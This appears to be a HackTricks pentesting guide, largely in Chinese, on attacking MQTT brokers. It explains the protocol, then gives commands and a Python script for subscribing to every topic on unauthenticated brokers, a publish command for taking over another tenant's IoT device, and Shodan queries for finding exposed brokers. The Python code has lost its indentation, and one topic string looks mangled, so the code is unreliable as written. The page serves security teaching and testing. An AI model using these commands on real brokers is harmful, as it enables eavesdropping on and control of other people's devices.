# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## 基本信息

**MQ Telemetry Transport (MQTT)** 是一种 **发布/订阅消息协议**，以极简和轻量著称。该协议专为设备性能受限并运行在带宽低、延迟高或连接不可靠的网络环境中而设计。MQTT 的主要目标包括最小化网络带宽使用和降低设备资源消耗。此外，它旨在维持可靠的通信并提供一定程度的投递保证。这些目标使得 MQTT 非常适合快速发展的 **machine-to-machine (M2M) 通信** 和 **物联网 (IoT)** 领域，在这些场景中高效地连接大量设备至关重要。另一个方面，MQTT 对移动应用也非常有利，因为在移动环境中节省带宽和电池寿命至关重要。

**默认端口：** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## 检查流量

当 MQTT brokers 收到 **CONNECT** 数据包时，会返回一个 **CONNACK** 数据包。该数据包包含一个返回码，对于理解连接状态至关重要。返回码为 **0x00** 表示凭证已被接受，表示连接成功。另一方面，返回码为 **0x05** 则表明凭证无效，从而阻止连接。

例如，如果 broker 因凭证无效而拒绝连接，情形如下：
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**身份验证是完全可选的**，即使启用了身份验证，**默认也不使用加密**（凭据以明文发送）。仍然可以执行 MITM 攻击来窃取密码。

要连接到 MQTT 服务，你可以使用： [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) 并通过以下方式订阅所有主题：
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
你也可以使用 [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

你还可以使用：
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
或者你可以**运行这段代码，尝试连接到一个无需认证的 MQTT 服务，订阅所有主题并监听它们**：
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### 发布/订阅 模式 <a href="#b667" id="b667"></a>

发布/订阅 模式包括：

- **发布者**：在 broker 的一个（或多个）topic 上发布消息。
- **订阅者**：订阅 broker 的一个（或多个）topic 并接收发布者发送的所有消息。
- **Broker**：将发布者的所有消息路由到订阅者。
- **Topic**：由一个或多个层级组成，层级之间用斜杠分隔（例如，/smartshouse/livingroom/temperature）。

### 数据包格式 <a href="#f15a" id="f15a"></a>

每个 MQTT 数据包包含一个固定头（Figure 02）。图 02：固定头

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### 数据包类型

- CONNECT (1)：由客户端发起，用于请求与服务器建立连接。
- CONNACK (2)：服务器对成功连接的确认。
- PUBLISH (3)：用于从客户端向服务器或从服务器向客户端发送消息。
- PUBACK (4)：对 PUBLISH 数据包的确认。
- PUBREC (5)：消息传递协议的一部分，确保消息已被接收。
- PUBREL (6)：消息传递的进一步保证，表示消息已被释放。
- PUBCOMP (7)：消息传递协议的最终部分，表示完成。
- SUBSCRIBE (8)：客户端请求订阅某个主题以接收消息。
- SUBACK (9)：服务器对 SUBSCRIBE 请求的确认。
- UNSUBSCRIBE (10)：客户端请求停止接收某个主题的消息。
- UNSUBACK (11)：服务器对 UNSUBSCRIBE 请求的响应。
- PINGREQ (12)：客户端发送的心跳消息。
- PINGRESP (13)：服务器对心跳消息的响应。
- DISCONNECT (14)：由客户端发起以终止连接。
- 值 0 和 15 被标记为保留，不允许使用。

## IoT MQTT 生态系统攻击：明文 broker 与 topic ACL 绕过

许多消费级 IoT 平台会暴露 MQTT broker，供两类不同角色使用：
- 将无线协议（例如 BLE/LoRa/Zigbee）桥接到云端的网关/集线器设备。
- 通过“app”主题控制设备的移动应用或 Web 后端。

在 pentest 期间可以利用的常见弱点：

- 在非标准端口上使用明文 MQTT（例如 TCP/8001）而不是 MQTTS。任何在路径上的观察者都能读取凭证和控制帧。使用 Wireshark 在异常端口上查找明文的 CONNECT/CONNACK 和 SUBSCRIBE/PUBLISH 流量。
- 每租户的 topic ACL 弱或缺失。如果 topic 的命名空间仅基于 deviceId（例如 "/tenantless/<deviceId>/tx"），任何经过认证的用户都可能对其他租户的设备执行 PUBLISH。
- 通过维护/管理主题泄露敏感数据（例如在配置更改后以明文广播的 Wi‑Fi 凭证）。

示例（用真实值替换占位符）：

订阅具有已知主题前缀和设备 ID 的潜在敏感主题：
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
当 ACLs 薄弱时的跨租户控制（向另一个租户的设备主题发布）：
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- 在 IoT 中，MQTT 在非标准端口上以明文传输很常见。考虑在替代端口上搜索代理服务器并通过协议检测确认。

## 参考资料

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
